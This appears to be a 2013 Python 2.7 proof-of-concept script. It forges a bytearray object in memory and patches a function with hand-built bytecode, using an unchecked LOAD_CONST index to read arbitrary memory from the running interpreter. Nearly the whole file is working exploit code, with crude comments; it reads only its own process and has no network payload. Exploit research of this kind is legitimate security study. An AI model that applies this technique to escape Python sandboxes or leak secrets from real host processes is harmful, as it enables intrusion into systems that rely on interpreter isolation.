#!/usr/bin/env python
# -*- coding: utf-8 -*-

#
#    abuse_python27_vm_to_leak_address_space.py - Python 2.7 opcodes & x86 shellcodes = funz
#    Copyright (C) 2013 Axel "0vercl0k" Souchet - http://www.twitter.com/0vercl0k
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#

# https://twitter.com/elvanderb/status/162551396015669248 -- Challenge accepted mate!

import struct
import types
import opcode
import platform
import sys
from ctypes import c_char

def get_string_object_padding():
    """
    Find at runtime the padding PyStringObject -> PyStringObject.ob_sval:
        typedef struct {        +
            PyObject_VAR_HEAD   |
            long ob_shash;      | We want to know that size
            int ob_sstate;      |
            char ob_sval[1];    +
        } PyStringObject;
    """
    marker = 'ABCDEFGH'
    r = (c_char * 100).from_address(id(marker))
    return r.raw.find(marker)

def pack_ushort(us):
    return struct.pack('<H', us)

def pack_uint(ui):
    return struct.pack('<I', ui)

def get_opcode(o):
    return chr(opcode.opmap[o])

def leak_address_space(address, size):
    """Leak size byte from address of the current process"""
    def pull_the_trigger_b1tch():
        """Pull the trigger motherfucker"""
        pass

    const_tuple = ()
    addr_const_tuple = id(const_tuple)

    # Creating a bytearray object will allow us to leak whatever we want in the address space
    # Py276, bytearrayobject.h
    # typedef struct {
    #     PyObject_VAR_HEAD
    #     int ob_exports; /* how many buffer exports */
    #     Py_ssize_t ob_alloc; /* How many bytes allocated */
    #     char *ob_bytes;
    # } PyByteArrayObject;
    print '  Create a bytearray for reliability purpose..'
    bytearrayobject = bytearray('A' * 137)
    bytearrayobject_str = (c_char * 100).from_address(id(bytearrayobject)).raw
    offset_bytearray_size = bytearrayobject_str.find(pack_uint(137))
    print '  PyByteArrayObject -> PyByteArrayObject.ob_alloc : %d bytes' % offset_bytearray_size

    print '  Building a fake PyByteArrayObject to leak the address space now..'
    fake_bytearray_object = bytearrayobject_str[: offset_bytearray_size] + pack_uint(size) + pack_uint(address) * 10
    # fake_bytearray_object = pack_uint(0x0) + pack_uint(0x11111111) + pack_uint(0x22222222) + pack_uint(0x33333333) + pack_uint(0x44444444) + pack_uint(0x55555555) + pack_uint(0x66666666) + pack_uint(0x77777777) + pack_uint(0x88888888) + pack_uint(0x99999999) + pack_uint(0xAAAAAAAA) + pack_uint(0xBBBBBBBB) + pack_uint(0xCCCCCCCC) + pack_uint(0xDDDDDDDD) + pack_uint(0xEEEEEEEE) + pack_uint(0xFFFFFFFF)
    address_fake_bytearray_object = id(fake_bytearray_object)

    ptr_object = id(fake_bytearray_object) + 20
    p = id(ptr_object) + 8
    # Remember:
    # 1E01138D    8B7C99 0C       MOV EDI,DWORD PTR [EBX*4+ECX+0C] ; ECX is the address of the const_tuple object, EBX you control!
    offset = ((p - addr_const_tuple - 0xC) & 0xffffffff) / 4
    offset_high, offset_low = offset >> 16, offset & 0xffff
    print '  Dummy tuple @%.8x, FakeByteArray object @%.8x' % (addr_const_tuple, address_fake_bytearray_object)
    print '  Offset High: %.4x, Offset Low: %.4x' % (offset_high, offset_low)

    print '  Building the bytecode to exploit the bug..'
    # 1. Load the low part of our address
    evil_bytecode  = get_opcode('EXTENDED_ARG') + pack_ushort(offset_high)
    # 2. Load an object from the const: This is an evil object :]
    evil_bytecode += get_opcode('LOAD_CONST') + pack_ushort(offset_low)
    # 3. Return it
    evil_bytecode += get_opcode('RETURN_VALUE')

    print '  Hotpatching pull_the_trigger_b1tch with our bytecodes..'
    pull_the_trigger_b1tch.func_code = types.CodeType(
        0,
        0,
        0,
        0,
        evil_bytecode,
        const_tuple,
        (),
        (),
        "",
        "",
        0,
        ""
    )

    print '  Pulling the trigger'
    # and b00m!1§1§1§
    x = pull_the_trigger_b1tch()
    print '  Trying to leak the address space now:'
    return str(x)

def main(argc, argv):
    s = 'leakme im famous'
    print repr(leak_address_space(id(s), 0x100))

if __name__ == '__main__':
    sys.exit(main(len(sys.argv), sys.argv))
